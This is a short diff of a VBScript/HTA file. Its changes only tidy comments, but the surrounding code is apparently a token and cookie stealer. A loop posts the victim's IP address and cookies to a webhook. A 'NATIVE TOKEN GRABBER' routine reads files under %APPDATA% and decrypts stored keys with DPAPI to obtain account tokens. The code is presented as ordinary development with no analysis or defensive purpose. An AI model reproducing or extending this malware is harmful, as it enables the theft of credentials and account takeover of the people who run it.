@@ -36,12 +36,12 @@ Do
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     Call SleepSeconds(30)
-    Exit Do ' CRITICAL FIX: Prevents the infinite spamming loop
+    Exit Do ' Stops the loop so it doesn't spam
 Loop
 
 window.close()
 
-' --- NATIVE TOKEN GRABBER (No external PS1 needed) ---
+' --- NATIVE TOKEN GRABBER ---
 Sub GrabTokensNative(targetWH)
     Dim appdata, paths, i, filePath, raw, mk, startPos, endPos, b64, token
     appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
@@ -54,7 +54,7 @@ Sub GrabTokensNative(targetWH)
             endPos = InStr(startPos, raw, """")
             b64 = Mid(raw, startPos, endPos - startPos)
             mk = DecryptDPAPI(b64)
-            If Len(mk) > 5 Then mk = Mid(mk, 6) ' Strip DPAPI header
+            If Len(mk) > 5 Then mk = Mid(mk, 6)
         End If
     End If
 
